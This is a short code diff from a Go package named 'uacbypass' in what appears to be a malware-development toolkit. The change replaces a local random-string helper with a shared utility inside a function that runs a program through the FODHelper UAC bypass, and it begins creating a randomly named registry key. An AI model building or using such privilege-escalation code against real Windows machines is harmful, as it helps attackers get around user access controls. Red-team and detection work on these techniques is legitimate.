@@ -5,7 +5,6 @@ package uacbypass
 
 import (
 	"fmt"
-	"math/rand"
 	"os/exec"
 	"runtime"
 	"syscall"
@@ -15,25 +14,14 @@ import (
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 
+	"github.com/oioio-space/maldev/core/utils"
 	"github.com/oioio-space/maldev/win/api"
 )
-
-// Go 1.20+ auto-seeds the global rand source; no init() needed.
-
-const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-
-func randomString(n int) string {
-	b := make([]byte, n)
-	for i := range b {
-		b[i] = letterBytes[rand.Intn(len(letterBytes))]
-	}
-	return string(b)
-}
 
 // FODHelper executes a program specified by path using the FODHelper UAC bypass.
 // Only works on Windows 10 and later.
 func FODHelper(path string) error {
-	randKeyName := randomString(5)
+	randKeyName, _ := utils.RandomString(5)
 
 	k, _, err := registry.CreateKey(
 		registry.CURRENT_USER,
